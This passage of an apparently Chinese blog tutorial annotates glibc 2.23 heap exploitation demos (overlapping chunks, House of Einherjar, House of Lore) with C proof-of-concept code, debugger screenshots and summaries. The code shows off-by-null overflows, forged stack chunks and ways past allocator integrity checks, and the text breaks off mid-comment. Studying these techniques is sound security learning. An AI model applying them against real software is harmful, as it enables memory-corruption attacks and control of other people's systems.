class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们释放b1和c,这将会合并b1和c(无视b2)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	<span class="comment">// 现在我们malloc d来和b2重叠</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-9"><a href="#运行结果及调试-9" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>此时我们断在分配了a，b，c，barrier</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516493479/0" alt="image-20210512123452148"></p>
<p>然后我们修改了b+0x1f0位为0x200</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516503194/0" alt="image-20210512123736375"></p>
<p>然后此时我们释放chunk b</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516510930/0" alt="image-20210512124027482"></p>
<p>然后此时我们将b的size改为0x200，可以与上图对比</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516514191/0" alt="image-20210512124142621"></p>
<p>此时我们再次malloc的时候，因为b被视为free态，此时会调用unlink</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516529148/0" alt="image-20210512124710639"></p>
<p>此时的b1已经被放到了原本b的位置，然后我们再malloc b2</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516537157/0" alt="image-20210512125019648"></p>
<p>随后我们释放b1和c，程序会直接无视b2合并b1和c</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516740491/0" alt="image-20210512135642809"></p>
<p>此时我们将合并后的chunk申请回来作为d，此时d就会和b2发生overlapping</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516749332/0" alt="image-20210512135925294"></p>
<p>然后我们给d赋值，b2就会被修改</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516753875/0" alt="image-20210512140042490"></p>
<h2 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk</p>
<p>随后为了绕过check,程序将b+0x1f0的位置设为了0x200</p>
<p>紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)</p>
<p>随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被放到b的部分,而b做了一个unlink,一分两半</p>
<p>随后程序又malloc了b2(0x80),b2依旧是所属b的</p>
<p>之后程序为了方便看效果,将b2填满了’B’</p>
<p>最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了</p>
<p>此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来</p>
<p>构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” :)</p>
<h1 id="0x11-house-of-einherjar"><a href="#0x11-house-of-einherjar" class="headerlink" title="0x11 house of einherjar"></a>0x11 house of einherjar</h1><p>这个技术是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址，并且这个是在glibc2.23的版本测试使用，利用off-by-null</p>
<h2 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="comment">// 我们可以在任意一个我们想要的地方来创建一个fake chunk，本例中我们将在栈上创建这个fake_chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 当然你也可以在heap或者bss段任意一个你知道地址的地方创建fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">    <span class="comment">//尽管有的时候我们可以在这儿使用unsafe unlink技术</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// 这个技术通过覆盖chunk的size以及pre_inuse位来工作</span></span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">    <span class="comment">// 如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">		   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">	<span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改fake chunk的size去反应b的新的prev_size</span></span><br><span class="line">	<span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free b，之后他就会和我们的fake chunk合并了</span></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果我们在free b之前分配另一个chunk,我们需要做两件事</span></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内</span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2)我们将需要在我们控制的地址写我们的fake chunk的size</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check</span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离</span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-10"><a href="#运行结果及调试-10" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先是chunk a</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516955852/0" alt="image-20210512144837108"></p>
<p>然后给我们的fake_chunk赋值</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516959141/0" alt="image-20210512144928302"></p>
<p>然后malloc了b</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13516978344/0" alt="image-20210512145418191"></p>
<p>然后我们将b的size的pre_inuse位置0</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13517001948/0" alt="image-20210512145944408"></p>
<p>此时设置我们的fake chunk的size和b的pre_size为b和fake chunk的差值</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881665/0" alt="image-20210512215635345"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881916/0" alt="image-20210512215642413"></p>
<p>现在我们free b，程序通过pre_size就会去找fake chunk，又发现fake chunk也是free态的，因此就会与我们的fake chunk合并，此时我们再次malloc的话</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13518886966/0" alt="image-20210512215843671"></p>
<h2 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了chunk a(0x38)</p>
<p>之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构</p>
<p>随后程序又malloc了chunk b(0xf8),b和top chunk相邻</p>
<p>我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b</p>
<p>此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了</p>
<p>条件：</p>
<ol>
<li>被合并的chunk需要在free态，可以直接释放啥的，也可以伪造为free态(通过下一个chunk的pre_inuse位)</li>
<li>伪造合并的chunk的pre_size和被合并的chunk的size需要相同</li>
</ol>
<h1 id="0x12-house-of-lore"><a href="#0x12-house-of-lore" class="headerlink" title="0x12 house of lore"></a>0x12 house of lore</h1><p>这个方法利用small bin的机制而导致任意地址分配，利用下面的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> e·rrout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">       [ ... ]</span><br></pre></td></tr></table></figure>
<p>我们需要做的就是将small bin的bk指针指向我们的fake chunk，也就是控制bck，但是要注意的是bck-&gt;fd!=victim这个地方需要绕过。</p>
<h2 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个版本也可以绕过glibc malloc引入的强化检查</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 分配victim  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="comment">// 这是堆上的第一个samll chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我们需要去掉头部大小才能得到真正的victim地址  </span></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在栈上创建一个fake chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted检查，这样就可以将我们的栈地址写到small bin list里了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查，这样就可以在栈上返回一个假的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 分配另一个large bin来避免small bin在free的时候与top chunk合并  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// free顶块,此时会将它放进unsorted bin中  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在unsorted bin中,victim的fwd和bk指针都是0  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在调用一个不会被unsorted bin或者small bin处理的malloc  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这也意味着chunk victim会被插入到smallbin的最前面  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line">  <span class="comment">// victim chunk已经被排序并且他的fwd和bk指针也被更新了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">  <span class="comment">// 现在假设我们有一个漏洞可以覆盖victim-&gt;bk指针</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="comment">// victim-&gt;bk正指向栈上</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="comment">// 